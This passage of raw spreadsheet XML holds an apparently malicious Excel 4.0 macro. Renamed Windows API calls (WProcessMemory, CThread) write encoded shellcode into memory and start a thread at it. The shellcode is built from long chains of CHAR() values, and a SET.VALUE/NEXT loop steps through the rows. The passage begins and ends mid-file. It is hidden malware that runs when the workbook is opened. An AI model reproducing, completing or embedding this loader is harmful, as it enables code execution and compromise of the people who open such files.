        <v>ÙØ~ì8óx¢_x001C_N</v>
      </c>
    </row>
    <row r="15" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A15" t="e">
        <f>WProcessMemory(-1,A10+(D1*255),main,LEN(main),0)</f>
        <v>#NAME?</v>
      </c>
      <c r="B15" t="str">
        <f>CHAR(176)&amp;CHAR(112)&amp;CHAR(113)&amp;CHAR(177)&amp;CHAR(125)&amp;CHAR(16)&amp;CHAR(114)&amp;CHAR(215)&amp;CHAR(221)&amp;CHAR(206)&amp;CHAR(51)&amp;CHAR(201)&amp;CHAR(154)&amp;CHAR(195)&amp;CHAR(252)&amp;CHAR(176)&amp;CHAR(89)&amp;CHAR(158)&amp;CHAR(234)&amp;CHAR(210)&amp;CHAR(4)&amp;CHAR(146)&amp;CHAR(235)&amp;CHAR(254)&amp;CHAR(13)&amp;CHAR(244)&amp;CHAR(131)&amp;CHAR(123)&amp;CHAR(26)&amp;CHAR(4)&amp;CHAR(208)&amp;CHAR(69)&amp;CHAR(148)&amp;CHAR(222)&amp;CHAR(98)&amp;CHAR(194)&amp;CHAR(9)&amp;CHAR(184)&amp;CHAR(187)&amp;CHAR(210)&amp;CHAR(129)&amp;CHAR(177)&amp;CHAR(210)&amp;CHAR(28)&amp;CHAR(140)&amp;CHAR(250)&amp;CHAR(138)&amp;CHAR(98)&amp;CHAR(154)&amp;CHAR(192)&amp;CHAR(171)&amp;CHAR(236)&amp;CHAR(187)&amp;CHAR(184)&amp;CHAR(74)&amp;CHAR(236)&amp;CHAR(24)&amp;CHAR(202)&amp;CHAR(240)&amp;CHAR(131)&amp;CHAR(215)&amp;CHAR(11)&amp;CHAR(74)&amp;CHAR(122)&amp;CHAR(161)&amp;CHAR(204)&amp;CHAR(101)&amp;CHAR(43)&amp;CHAR(111)&amp;CHAR(138)&amp;CHAR(222)&amp;CHAR(39)&amp;CHAR(102)&amp;CHAR(14)&amp;CHAR(77)&amp;CHAR(159)&amp;CHAR(87)&amp;CHAR(16)&amp;CHAR(16)&amp;CHAR(49)&amp;CHAR(39)&amp;CHAR(139)&amp;CHAR(230)&amp;CHAR(211)&amp;CHAR(163)&amp;CHAR(31)&amp;CHAR(188)&amp;CHAR(17)&amp;CHAR(41)&amp;CHAR(149)&amp;CHAR(71)&amp;CHAR(91)&amp;CHAR(73)&amp;CHAR(108)&amp;CHAR(207)&amp;CHAR(75)&amp;CHAR(145)&amp;CHAR(14)&amp;CHAR(87)&amp;CHAR(49)&amp;CHAR(119)&amp;CHAR(174)&amp;CHAR(218)&amp;CHAR(244)&amp;CHAR(13)&amp;CHAR(219)&amp;CHAR(197)&amp;CHAR(15)&amp;CHAR(105)&amp;CHAR(193)&amp;CHAR(231)&amp;CHAR(30)&amp;CHAR(187)&amp;CHAR(19)&amp;CHAR(66)&amp;CHAR(8)&amp;CHAR(141)&amp;CHAR(181)&amp;CHAR(219)&amp;CHAR(55)&amp;CHAR(48)&amp;CHAR(218)&amp;CHAR(79)&amp;CHAR(217)&amp;CHAR(60)&amp;CHAR(138)&amp;CHAR(27)&amp;CHAR(79)&amp;CHAR(121)&amp;CHAR(48)&amp;CHAR(155)&amp;CHAR(100)&amp;CHAR(71)&amp;CHAR(84)&amp;CHAR(235)&amp;CHAR(252)&amp;CHAR(57)&amp;CHAR(52)&amp;CHAR(198)&amp;CHAR(220)&amp;CHAR(10)&amp;CHAR(100)&amp;CHAR(244)&amp;CHAR(237)&amp;CHAR(53)&amp;CHAR(231)&amp;CHAR(248)&amp;CHAR(203)&amp;CHAR(132)&amp;CHAR(50)&amp;CHAR(118)&amp;CHAR(88)&amp;CHAR(34)&amp;CHAR(193)&amp;CHAR(171)&amp;CHAR(110)&amp;CHAR(63)&amp;CHAR(246)&amp;CHAR(73)&amp;CHAR(220)&amp;CHAR(95)&amp;CHAR(79)&amp;CHAR(126)&amp;CHAR(92)&amp;CHAR(133)&amp;CHAR(55)&amp;CHAR(92)&amp;CHAR(132)&amp;CHAR(114)&amp;CHAR(255)&amp;CHAR(163)&amp;CHAR(158)&amp;CHAR(174)&amp;CHAR(134)&amp;CHAR(180)&amp;CHAR(6)&amp;CHAR(217)&amp;CHAR(64)&amp;CHAR(196)&amp;CHAR(241)&amp;CHAR(159)&amp;CHAR(45)&amp;CHAR(106)&amp;CHAR(123)&amp;CHAR(75)&amp;CHAR(65)&amp;CHAR(185)&amp;CHAR(10)&amp;CHAR(136)&amp;CHAR(205)&amp;CHAR(116)&amp;CHAR(225)&amp;CHAR(43)&amp;CHAR(175)&amp;CHAR(128)&amp;CHAR(57)&amp;CHAR(221)&amp;CHAR(21)&amp;CHAR(52)&amp;CHAR(83)&amp;CHAR(38)&amp;CHAR(103)&amp;CHAR(5)&amp;CHAR(147)&amp;CHAR(86)&amp;CHAR(110)&amp;CHAR(246)&amp;CHAR(20)&amp;CHAR(254)&amp;CHAR(243)&amp;CHAR(23)&amp;CHAR(71)&amp;CHAR(45)&amp;CHAR(123)&amp;CHAR(46)&amp;CHAR(226)&amp;CHAR(174)&amp;CHAR(155)&amp;CHAR(235)&amp;CHAR(5)&amp;CHAR(39)&amp;CHAR(13)&amp;CHAR(150)&amp;CHAR(184)&amp;CHAR(130)&amp;CHAR(45)&amp;CHAR(175)&amp;CHAR(180)&amp;CHAR(65)&amp;CHAR(3)&amp;CHAR(221)&amp;CHAR(86)&amp;CHAR(175)&amp;CHAR(211)&amp;CHAR(26)&amp;CHAR(171)&amp;CHAR(100)&amp;CHAR(110)&amp;CHAR(49)&amp;CHAR(23)&amp;CHAR(118)&amp;CHAR(114)&amp;CHAR(69)&amp;CHAR(214)&amp;CHAR(170)&amp;CHAR(82)&amp;CHAR(206)&amp;CHAR(46)&amp;CHAR(12)&amp;CHAR(255)&amp;CHAR(85)&amp;CHAR(219)&amp;CHAR(205)&amp;CHAR(128)&amp;CHAR(119)</f>
        <v>°pq±}_x0010_r×ÝÎ3ÉšÃü°YžêÒ_x0004_’ëþ_x000D_ôƒ{_x001A__x0004_ÐE”ÞbÂ	¸»Ò±Ò_x001C_ŒúŠbšÀ«ì»¸Jì_x0018_Êðƒ×_x000B_Jz¡Ìe+oŠÞ'f_x000E_MŸW_x0010__x0010_1'‹æÓ£_x001F_¼_x0011_)•G[IlÏK‘_x000E_W1w®Úô_x000D_ÛÅ_x000F_iÁç_x001E_»_x0013_B_x0008_µÛ70ÚOÙ&lt;Š_x001B_Oy0›dGTëü94ÆÜ
dôí5çøË„2vX"Á«n?öIÜ_O~\…7\„rÿ£ž®†´_x0006_Ù@ÄñŸ-j{KA¹
ˆÍtá+¯€9Ý_x0015_4S&amp;g_x0005_“Vnö_x0014_þó_x0017_G-{.â®›ë_x0005_'_x000D_–¸‚-¯´A_x0003_ÝV¯Ó_x001A_«dn1_x0017_vrEÖªRÎ._x000C_ÿUÛÍ€w</v>
      </c>
      <c r="C15" t="str">
        <f>CHAR(8)&amp;CHAR(242)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(192)&amp;CHAR(103)&amp;CHAR(156)&amp;CHAR(199)&amp;CHAR(190)&amp;CHAR(244)</f>
        <v>_x0008_òqzÀgœÇ¾ô</v>
      </c>
    </row>
    <row r="16" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A16" t="b">
        <f>SET.VALUE(D1,D1+1)</f>
        <v>0</v>
      </c>
      <c r="B16" t="str">
        <f>CHAR(58)&amp;CHAR(53)&amp;CHAR(73)&amp;CHAR(191)&amp;CHAR(146)&amp;CHAR(1)&amp;CHAR(173)&amp;CHAR(242)&amp;CHAR(155)&amp;CHAR(148)&amp;CHAR(6)&amp;CHAR(141)&amp;CHAR(54)&amp;CHAR(227)&amp;CHAR(173)&amp;CHAR(183)&amp;CHAR(47)&amp;CHAR(170)&amp;CHAR(75)&amp;CHAR(216)&amp;CHAR(132)&amp;CHAR(138)&amp;CHAR(110)&amp;CHAR(15)&amp;CHAR(216)&amp;CHAR(155)&amp;CHAR(184)&amp;CHAR(116)&amp;CHAR(61)&amp;CHAR(250)&amp;CHAR(98)&amp;CHAR(135)&amp;CHAR(169)&amp;CHAR(99)&amp;CHAR(75)&amp;CHAR(233)&amp;CHAR(83)&amp;CHAR(147)&amp;CHAR(70)&amp;CHAR(51)&amp;CHAR(120)&amp;CHAR(163)&amp;CHAR(26)&amp;CHAR(237)&amp;CHAR(39)&amp;CHAR(31)&amp;CHAR(111)&amp;CHAR(146)&amp;CHAR(28)&amp;CHAR(170)&amp;CHAR(89)&amp;CHAR(5)&amp;CHAR(253)&amp;CHAR(193)&amp;CHAR(211)&amp;CHAR(87)&amp;CHAR(37)&amp;CHAR(176)&amp;CHAR(218)&amp;CHAR(200)&amp;CHAR(124)&amp;CHAR(104)&amp;CHAR(140)&amp;CHAR(167)&amp;CHAR(29)&amp;CHAR(22)&amp;CHAR(78)&amp;CHAR(207)&amp;CHAR(230)&amp;CHAR(16)&amp;CHAR(227)&amp;CHAR(196)&amp;CHAR(89)&amp;CHAR(12)&amp;CHAR(250)&amp;CHAR(64)&amp;CHAR(73)&amp;CHAR(164)&amp;CHAR(230)&amp;CHAR(195)&amp;CHAR(190)&amp;CHAR(110)&amp;CHAR(66)&amp;CHAR(45)&amp;CHAR(238)&amp;CHAR(191)&amp;CHAR(118)&amp;CHAR(202)&amp;CHAR(122)&amp;CHAR(42)&amp;CHAR(251)&amp;CHAR(8)&amp;CHAR(116)&amp;CHAR(195)&amp;CHAR(251)&amp;CHAR(212)&amp;CHAR(161)&amp;CHAR(144)&amp;CHAR(58)&amp;CHAR(98)&amp;CHAR(136)&amp;CHAR(102)&amp;CHAR(242)&amp;CHAR(12)&amp;CHAR(254)&amp;CHAR(87)&amp;CHAR(75)&amp;CHAR(103)&amp;CHAR(98)&amp;CHAR(4)&amp;CHAR(31)&amp;CHAR(142)&amp;CHAR(90)&amp;CHAR(204)&amp;CHAR(55)&amp;CHAR(193)&amp;CHAR(93)&amp;CHAR(77)&amp;CHAR(205)&amp;CHAR(98)&amp;CHAR(64)&amp;CHAR(81)&amp;CHAR(1)&amp;CHAR(50)&amp;CHAR(12)&amp;CHAR(167)&amp;CHAR(140)&amp;CHAR(202)&amp;CHAR(178)&amp;CHAR(235)&amp;CHAR(98)&amp;CHAR(243)&amp;CHAR(13)&amp;CHAR(249)&amp;CHAR(237)&amp;CHAR(47)&amp;CHAR(109)&amp;CHAR(50)&amp;CHAR(237)&amp;CHAR(92)&amp;CHAR(185)&amp;CHAR(2)&amp;CHAR(238)&amp;CHAR(76)&amp;CHAR(211)&amp;CHAR(250)&amp;CHAR(199)&amp;CHAR(72)&amp;CHAR(185)&amp;CHAR(149)&amp;CHAR(47)&amp;CHAR(145)&amp;CHAR(107)&amp;CHAR(75)&amp;CHAR(90)&amp;CHAR(194)&amp;CHAR(63)&amp;CHAR(76)&amp;CHAR(16)&amp;CHAR(222)&amp;CHAR(226)&amp;CHAR(237)&amp;CHAR(123)&amp;CHAR(251)&amp;CHAR(157)&amp;CHAR(216)&amp;CHAR(215)&amp;CHAR(100)&amp;CHAR(162)&amp;CHAR(105)&amp;CHAR(156)&amp;CHAR(5)&amp;CHAR(148)&amp;CHAR(6)&amp;CHAR(143)&amp;CHAR(140)&amp;CHAR(159)&amp;CHAR(242)&amp;CHAR(95)&amp;CHAR(168)&amp;CHAR(125)&amp;CHAR(187)&amp;CHAR(65)&amp;CHAR(58)&amp;CHAR(149)&amp;CHAR(79)&amp;CHAR(178)&amp;CHAR(197)&amp;CHAR(12)&amp;CHAR(31)&amp;CHAR(181)&amp;CHAR(132)&amp;CHAR(212)&amp;CHAR(119)&amp;CHAR(73)&amp;CHAR(193)&amp;CHAR(14)&amp;CHAR(205)&amp;CHAR(37)&amp;CHAR(206)&amp;CHAR(83)&amp;CHAR(201)&amp;CHAR(47)&amp;CHAR(11)&amp;CHAR(88)&amp;CHAR(108)&amp;CHAR(144)&amp;CHAR(135)&amp;CHAR(158)&amp;CHAR(196)&amp;CHAR(13)&amp;CHAR(4)&amp;CHAR(48)&amp;CHAR(114)&amp;CHAR(48)&amp;CHAR(12)&amp;CHAR(23)&amp;CHAR(84)&amp;CHAR(206)&amp;CHAR(106)&amp;CHAR(134)&amp;CHAR(229)&amp;CHAR(115)&amp;CHAR(33)&amp;CHAR(51)&amp;CHAR(184)&amp;CHAR(160)&amp;CHAR(109)&amp;CHAR(47)&amp;CHAR(110)&amp;CHAR(67)&amp;CHAR(60)&amp;CHAR(3)&amp;CHAR(201)&amp;CHAR(70)&amp;CHAR(181)&amp;CHAR(35)&amp;CHAR(147)&amp;CHAR(114)&amp;CHAR(98)&amp;CHAR(235)&amp;CHAR(226)&amp;CHAR(108)&amp;CHAR(10)&amp;CHAR(175)&amp;CHAR(33)&amp;CHAR(231)&amp;CHAR(96)&amp;CHAR(45)&amp;CHAR(61)&amp;CHAR(245)&amp;CHAR(222)&amp;CHAR(207)&amp;CHAR(176)&amp;CHAR(110)</f>
        <v>:5I¿’_x0001_­ò›”_x0006_6ã­·/ªKØ„Šn_x000F_Ø›¸t=úb‡©cKéS“F3x£_x001A_í'_x001F_o’_x001C_ªY_x0005_ýÁÓW%°ÚÈ|hŒ§_x001D__x0016_NÏæ_x0010_ãÄY_x000C_ú@I¤æÃ¾nB-î¿vÊz*û_x0008_tÃûÔ¡:bˆfò_x000C_þWKgb_x0004__x001F_ŽZÌ7Á]MÍb@Q_x0001_2_x000C_§ŒÊ²ëbó_x000D_ùí/m2í\¹_x0002_îLÓúÇH¹•/‘kKZÂ?L_x0010_Þâí{ûØ×d¢iœ_x0005_”_x0006_ŒŸò_¨}»A:•O²Å_x000C__x001F_µ„ÔwIÁ_x000E_Í%ÎSÉ/_x000B_Xl‡žÄ_x000D__x0004_0r0_x000C__x0017_TÎj†ås!3¸ m/nC&lt;_x0003_ÉFµ#“rbëâl
¯!ç`-=õÞÏ°n</v>
      </c>
      <c r="C16" t="str">
        <f>CHAR(113)&amp;CHAR(146)&amp;CHAR(34)&amp;CHAR(238)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(240)&amp;CHAR(121)&amp;CHAR(124)&amp;CHAR(185)</f>
        <v>q’"î‘[ðy|¹</v>
      </c>
    </row>
    <row r="17" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A17" t="b">
        <f bx="1">main=ABSREF("R[1]C",main)</f>
        <v>0</v>
      </c>
      <c r="B17" t="str">
        <f>CHAR(42)&amp;CHAR(144)&amp;CHAR(71)&amp;CHAR(35)&amp;CHAR(102)&amp;CHAR(35)&amp;CHAR(32)&amp;CHAR(186)&amp;CHAR(44)&amp;CHAR(109)&amp;CHAR(103)&amp;CHAR(184)&amp;CHAR(161)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(217)&amp;CHAR(247)&amp;CHAR(194)&amp;CHAR(225)&amp;CHAR(141)&amp;CHAR(152)&amp;CHAR(76)&amp;CHAR(1)&amp;CHAR(181)&amp;CHAR(196)&amp;CHAR(249)&amp;CHAR(47)&amp;CHAR(24)&amp;CHAR(193)&amp;CHAR(75)&amp;CHAR(144)&amp;CHAR(68)&amp;CHAR(231)&amp;CHAR(206)&amp;CHAR(180)&amp;CHAR(122)&amp;CHAR(128)&amp;CHAR(124)&amp;CHAR(245)&amp;CHAR(24)&amp;CHAR(7)&amp;CHAR(77)&amp;CHAR(33)&amp;CHAR(205)&amp;CHAR(9)&amp;CHAR(50)&amp;CHAR(39)&amp;CHAR(64)&amp;CHAR(249)&amp;CHAR(228)&amp;CHAR(28)&amp;CHAR(156)&amp;CHAR(130)&amp;CHAR(177)&amp;CHAR(74)&amp;CHAR(118)&amp;CHAR(210)&amp;CHAR(206)&amp;CHAR(57)&amp;CHAR(123)&amp;CHAR(87)&amp;CHAR(89)&amp;CHAR(112)&amp;CHAR(111)&amp;CHAR(109)&amp;CHAR(225)&amp;CHAR(61)&amp;CHAR(227)&amp;CHAR(247)&amp;CHAR(186)&amp;CHAR(152)&amp;CHAR(118)&amp;CHAR(162)&amp;CHAR(237)&amp;CHAR(208)&amp;CHAR(55)&amp;CHAR(24)&amp;CHAR(66)&amp;CHAR(133)&amp;CHAR(145)&amp;CHAR(76)&amp;CHAR(222)&amp;CHAR(60)&amp;CHAR(53)&amp;CHAR(59)&amp;CHAR(249)&amp;CHAR(147)&amp;CHAR(28)&amp;CHAR(162)&amp;CHAR(184)&amp;CHAR(131)&amp;CHAR(141)&amp;CHAR(115)&amp;CHAR(122)&amp;CHAR(132)&amp;CHAR(124)&amp;CHAR(98)&amp;CHAR(215)&amp;CHAR(71)&amp;CHAR(214)&amp;CHAR(77)&amp;CHAR(49)&amp;CHAR(237)&amp;CHAR(224)&amp;CHAR(231)&amp;CHAR(189)&amp;CHAR(28)&amp;CHAR(72)&amp;CHAR(46)&amp;CHAR(116)&amp;CHAR(204)&amp;CHAR(146)&amp;CHAR(145)&amp;CHAR(213)&amp;CHAR(32)&amp;CHAR(201)&amp;CHAR(206)&amp;CHAR(193)&amp;CHAR(143)&amp;CHAR(228)&amp;CHAR(86)&amp;CHAR(234)&amp;CHAR(113)&amp;CHAR(90)&amp;CHAR(33)&amp;CHAR(224)&amp;CHAR(102)&amp;CHAR(199)&amp;CHAR(173)&amp;CHAR(116)&amp;CHAR(35)&amp;CHAR(31)&amp;CHAR(80)&amp;CHAR(37)&amp;CHAR(207)&amp;CHAR(140)&amp;CHAR(200)&amp;CHAR(231)&amp;CHAR(67)&amp;CHAR(93)&amp;CHAR(125)&amp;CHAR(229)&amp;CHAR(238)&amp;CHAR(43)&amp;CHAR(5)&amp;CHAR(150)&amp;CHAR(11)&amp;CHAR(133)&amp;CHAR(255)&amp;CHAR(231)&amp;CHAR(226)&amp;CHAR(198)&amp;CHAR(158)&amp;CHAR(196)&amp;CHAR(233)&amp;CHAR(101)&amp;CHAR(206)&amp;CHAR(48)&amp;CHAR(198)&amp;CHAR(48)&amp;CHAR(3)&amp;CHAR(97)&amp;CHAR(83)&amp;CHAR(99)&amp;CHAR(90)&amp;CHAR(194)&amp;CHAR(96)&amp;CHAR(42)&amp;CHAR(75)&amp;CHAR(193)&amp;CHAR(223)&amp;CHAR(157)&amp;CHAR(142)&amp;CHAR(46)&amp;CHAR(183)&amp;CHAR(176)&amp;CHAR(77)&amp;CHAR(129)&amp;CHAR(80)&amp;CHAR(136)&amp;CHAR(211)&amp;CHAR(45)&amp;CHAR(58)&amp;CHAR(175)&amp;CHAR(69)&amp;CHAR(105)&amp;CHAR(216)&amp;CHAR(25)&amp;CHAR(198)&amp;CHAR(52)&amp;CHAR(67)&amp;CHAR(112)&amp;CHAR(208)&amp;CHAR(163)&amp;CHAR(78)&amp;CHAR(135)&amp;CHAR(18)&amp;CHAR(12)&amp;CHAR(250)&amp;CHAR(13)&amp;CHAR(109)&amp;CHAR(33)&amp;CHAR(89)&amp;CHAR(134)&amp;CHAR(218)&amp;CHAR(63)&amp;CHAR(243)&amp;CHAR(41)&amp;CHAR(212)&amp;CHAR(185)&amp;CHAR(236)&amp;CHAR(109)&amp;CHAR(138)&amp;CHAR(105)&amp;CHAR(158)&amp;CHAR(126)&amp;CHAR(196)&amp;CHAR(179)&amp;CHAR(151)&amp;CHAR(120)&amp;CHAR(14)&amp;CHAR(168)&amp;CHAR(158)&amp;CHAR(7)&amp;CHAR(195)&amp;CHAR(142)&amp;CHAR(160)&amp;CHAR(209)&amp;CHAR(94)&amp;CHAR(125)&amp;CHAR(66)&amp;CHAR(93)&amp;CHAR(50)&amp;CHAR(238)&amp;CHAR(116)&amp;CHAR(93)&amp;CHAR(159)&amp;CHAR(99)&amp;CHAR(174)&amp;CHAR(212)&amp;CHAR(48)&amp;CHAR(63)&amp;CHAR(10)&amp;CHAR(74)&amp;CHAR(218)&amp;CHAR(145)&amp;CHAR(50)&amp;CHAR(37)&amp;CHAR(52)&amp;CHAR(9)&amp;CHAR(49)&amp;CHAR(72)&amp;CHAR(96)&amp;CHAR(2)&amp;CHAR(35)</f>
        <v>*G#f# º,mg¸¡ê‘Ù÷Âá˜L_x0001_µÄù/_x0018_ÁKDçÎ´z€|õ_x0018__x0007_M!Í	2'@ùä_x001C_œ‚±JvÒÎ9{WYpomá=ã÷º˜v¢íÐ7_x0018_B…‘LÞ&lt;5;ù“_x001C_¢¸ƒsz„|b×GÖM1íàç½_x001C_H.tÌ’‘Õ ÉÎÁäVêqZ!àfÇ­t#_x001F_P%ÏŒÈçC]}åî+_x0005_–_x000B_…ÿçâÆžÄéeÎ0Æ0_x0003_aScZÂ`*KÁßŽ.·°MPˆÓ-:¯EiØ_x0019_Æ4CpÐ£N‡_x0012__x000C_ú_x000D_m!Y†Ú?ó)Ô¹ìmŠiž~Ä³—x_x000E_¨ž_x0007_ÃŽ Ñ^}B]2ît]Ÿc®Ô0?
JÚ‘2%4	1H`_x0002_#</v>
      </c>
      <c r="C17" t="str">
        <f>CHAR(142)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(62)&amp;CHAR(240)&amp;CHAR(127)&amp;CHAR(69)&amp;CHAR(95)&amp;CHAR(160)&amp;CHAR(234)</f>
        <v>Žê‘&gt;ðE_ ê</v>
      </c>
    </row>
    <row r="18" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A18" t="b">
        <f>NEXT()</f>
        <v>0</v>
      </c>
      <c r="B18" t="str">
        <f>CHAR(201)&amp;CHAR(101)&amp;CHAR(87)&amp;CHAR(30)&amp;CHAR(149)&amp;CHAR(151)&amp;CHAR(37)&amp;CHAR(217)&amp;CHAR(86)&amp;CHAR(218)&amp;CHAR(74)&amp;CHAR(241)&amp;CHAR(166)&amp;CHAR(207)&amp;CHAR(90)&amp;CHAR(167)&amp;CHAR(170)&amp;CHAR(208)&amp;CHAR(117)&amp;CHAR(94)&amp;CHAR(73)&amp;CHAR(132)&amp;CHAR(61)&amp;CHAR(141)&amp;CHAR(241)&amp;CHAR(194)&amp;CHAR(232)&amp;CHAR(32)&amp;CHAR(92)&amp;CHAR(50)&amp;CHAR(116)&amp;CHAR(74)&amp;CHAR(87)&amp;CHAR(228)&amp;CHAR(231)&amp;CHAR(99)&amp;CHAR(110)&amp;CHAR(220)&amp;CHAR(246)&amp;CHAR(55)&amp;CHAR(58)&amp;CHAR(221)&amp;CHAR(162)&amp;CHAR(207)&amp;CHAR(218)&amp;CHAR(44)&amp;CHAR(147)&amp;CHAR(189)&amp;CHAR(138)&amp;CHAR(59)&amp;CHAR(192)&amp;CHAR(94)&amp;CHAR(74)&amp;CHAR(243)&amp;CHAR(220)&amp;CHAR(105)&amp;CHAR(116)&amp;CHAR(180)&amp;CHAR(110)&amp;CHAR(119)&amp;CHAR(153)&amp;CHAR(131)&amp;CHAR(32)&amp;CHAR(69)&amp;CHAR(232)&amp;CHAR(160)&amp;CHAR(155)&amp;CHAR(243)&amp;CHAR(165)&amp;CHAR(36)&amp;CHAR(223)&amp;CHAR(151)&amp;CHAR(27)&amp;CHAR(49)&amp;CHAR(91)&amp;CHAR(115)&amp;CHAR(19)&amp;CHAR(156)&amp;CHAR(120)&amp;CHAR(148)&amp;CHAR(139)&amp;CHAR(230)&amp;CHAR(80)&amp;CHAR(119)&amp;CHAR(220)&amp;CHAR(227)&amp;CHAR(173)&amp;CHAR(106)&amp;CHAR(225)&amp;CHAR(235)&amp;CHAR(72)&amp;CHAR(173)&amp;CHAR(15)&amp;CHAR(159)&amp;CHAR(170)&amp;CHAR(189)&amp;CHAR(210)&amp;CHAR(80)&amp;CHAR(218)&amp;CHAR(115)&amp;CHAR(104)&amp;CHAR(132)&amp;CHAR(138)&amp;CHAR(115)&amp;CHAR(167)&amp;CHAR(245)&amp;CHAR(76)&amp;CHAR(175)&amp;CHAR(136)&amp;CHAR(168)&amp;CHAR(70)&amp;CHAR(52)&amp;CHAR(72)&amp;CHAR(44)&amp;CHAR(224)&amp;CHAR(203)&amp;CHAR(38)&amp;CHAR(69)&amp;CHAR(140)&amp;CHAR(123)&amp;CHAR(226)&amp;CHAR(12)&amp;CHAR(164)&amp;CHAR(177)&amp;CHAR(221)&amp;CHAR(51)&amp;CHAR(216)&amp;CHAR(196)&amp;CHAR(251)&amp;CHAR(121)&amp;CHAR(113)&amp;CHAR(168)&amp;CHAR(154)&amp;CHAR(49)&amp;CHAR(225)&amp;CHAR(89)&amp;CHAR(170)&amp;CHAR(174)&amp;CHAR(250)&amp;CHAR(75)&amp;CHAR(105)&amp;CHAR(174)&amp;CHAR(28)&amp;CHAR(13)&amp;CHAR(199)&amp;CHAR(186)&amp;CHAR(188)&amp;CHAR(16)&amp;CHAR(116)&amp;CHAR(125)&amp;CHAR(253)&amp;CHAR(203)&amp;CHAR(191)&amp;CHAR(75)&amp;CHAR(34)&amp;CHAR(65)&amp;CHAR(182)&amp;CHAR(144)&amp;CHAR(56)&amp;CHAR(238)&amp;CHAR(5)&amp;CHAR(69)&amp;CHAR(97)&amp;CHAR(177)&amp;CHAR(52)&amp;CHAR(139)&amp;CHAR(106)&amp;CHAR(149)&amp;CHAR(141)&amp;CHAR(127)&amp;CHAR(168)&amp;CHAR(207)&amp;CHAR(202)&amp;CHAR(152)&amp;CHAR(221)&amp;CHAR(144)&amp;CHAR(51)&amp;CHAR(82)&amp;CHAR(158)&amp;CHAR(196)&amp;CHAR(255)&amp;CHAR(131)&amp;CHAR(228)&amp;CHAR(167)&amp;CHAR(170)&amp;CHAR(147)&amp;CHAR(111)&amp;CHAR(37)&amp;CHAR(34)&amp;CHAR(180)&amp;CHAR(197)&amp;CHAR(232)&amp;CHAR(180)&amp;CHAR(176)&amp;CHAR(195)&amp;CHAR(132)&amp;CHAR(118)&amp;CHAR(185)&amp;CHAR(38)&amp;CHAR(196)&amp;CHAR(211)&amp;CHAR(204)&amp;CHAR(152)&amp;CHAR(16)&amp;CHAR(36)&amp;CHAR(182)&amp;CHAR(198)&amp;CHAR(65)&amp;CHAR(160)&amp;CHAR(57)&amp;CHAR(253)&amp;CHAR(6)&amp;CHAR(143)&amp;CHAR(216)&amp;CHAR(67)&amp;CHAR(255)&amp;CHAR(66)&amp;CHAR(142)&amp;CHAR(32)&amp;CHAR(218)&amp;CHAR(153)&amp;CHAR(229)&amp;CHAR(143)&amp;CHAR(175)&amp;CHAR(169)&amp;CHAR(165)&amp;CHAR(25)&amp;CHAR(56)&amp;CHAR(103)&amp;CHAR(242)&amp;CHAR(14)&amp;CHAR(216)&amp;CHAR(193)&amp;CHAR(121)&amp;CHAR(1)&amp;CHAR(109)&amp;CHAR(8)&amp;CHAR(93)&amp;CHAR(222)&amp;CHAR(106)&amp;CHAR(5)&amp;CHAR(97)&amp;CHAR(230)&amp;CHAR(74)&amp;CHAR(50)&amp;CHAR(149)&amp;CHAR(163)&amp;CHAR(153)&amp;CHAR(90)&amp;CHAR(213)&amp;CHAR(254)&amp;CHAR(94)&amp;CHAR(254)&amp;CHAR(2)&amp;CHAR(193)</f>
        <v>ÉeW_x001E_•—%ÙVÚJñ¦ÏZ§ªÐu^I„=ñÂè \2tJWäçcnÜö7:Ý¢ÏÚ,“½Š;À^JóÜit´nw™ƒ Eè ›ó¥$ß—_x001B_1[s_x0013_œx”‹æPwÜã­jáëH­_x000F_Ÿª½ÒPÚsh„Šs§õL¯ˆ¨F4H,àË&amp;EŒ{â_x000C_¤±Ý3ØÄûyq¨š1áYª®úKi®_x001C__x000D_Çº¼_x0010_t}ýË¿K"A¶8î_x0005_Ea±4‹j•¨ÏÊ˜Ý3RžÄÿƒä§ª“o%"´Åè´°Ã„v¹&amp;ÄÓÌ˜_x0010_$¶ÆA 9ý_x0006_ØCÿBŽ Ú™å¯©¥_x0019_8gò_x000E_ØÁy_x0001_m_x0008_]Þj_x0005_aæJ2•£™ZÕþ^þ_x0002_Á</v>
      </c>
      <c r="C18" t="str">
        <f>CHAR(145)&amp;CHAR(91)&amp;CHAR(71)&amp;CHAR(162)&amp;CHAR(105)&amp;CHAR(31)&amp;CHAR(192)&amp;CHAR(97)&amp;CHAR(165)&amp;CHAR(126)</f>
        <v>‘[G¢i_x001F_Àa¥~</v>
      </c>
    </row>
    <row r="19" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A19" t="e">
        <f>CThread(0,0,A10,0,0,0)</f>
        <v>#NAME?</v>
      </c>
      <c r="B19" t="str">
        <f>CHAR(70)&amp;CHAR(189)&amp;CHAR(141)&amp;CHAR(186)&amp;CHAR(158)&amp;CHAR(242)&amp;CHAR(46)&amp;CHAR(19)&amp;CHAR(139)&amp;CHAR(213)&amp;CHAR(121)&amp;CHAR(180)&amp;CHAR(33)&amp;CHAR(243)&amp;CHAR(111)&amp;CHAR(18)&amp;CHAR(179)&amp;CHAR(118)&amp;CHAR(55)&amp;CHAR(20)&amp;CHAR(214)&amp;CHAR(164)&amp;CHAR(82)&amp;CHAR(232)&amp;CHAR(110)&amp;CHAR(136)&amp;CHAR(152)&amp;CHAR(18)&amp;CHAR(108)&amp;CHAR(89)&amp;CHAR(30)&amp;CHAR(26)&amp;CHAR(153)&amp;CHAR(10)&amp;CHAR(239)&amp;CHAR(210)&amp;CHAR(180)&amp;CHAR(152)&amp;CHAR(118)&amp;CHAR(197)&amp;CHAR(112)&amp;CHAR(152)&amp;CHAR(236)&amp;CHAR(58)&amp;CHAR(29)&amp;CHAR(131)&amp;CHAR(85)&amp;CHAR(44)&amp;CHAR(6)&amp;CHAR(53)&amp;CHAR(240)&amp;CHAR(114)&amp;CHAR(11)&amp;CHAR(208)&amp;CHAR(43)&amp;CHAR(237)&amp;CHAR(239)&amp;CHAR(106)&amp;CHAR(62)&amp;CHAR(135)&amp;CHAR(196)&amp;CHAR(193)&amp;CHAR(227)&amp;CHAR(16)&amp;CHAR(130)&amp